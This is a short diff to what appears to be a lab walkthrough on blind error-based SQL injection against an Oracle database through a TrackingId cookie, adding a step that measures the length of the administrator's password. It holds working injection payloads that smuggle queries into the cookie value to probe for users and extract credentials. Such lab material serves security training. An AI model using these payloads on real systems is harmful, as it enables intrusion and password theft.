@@ -42,3 +42,8 @@ TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual
 --You can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username administrator exists:
 TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 --Verify that the condition is true (the error is received), confirming that there is a user called administrator. 
+
+--The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:
+TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+--This condition should be true, confirming that the password is greater than 1 character in length.
+
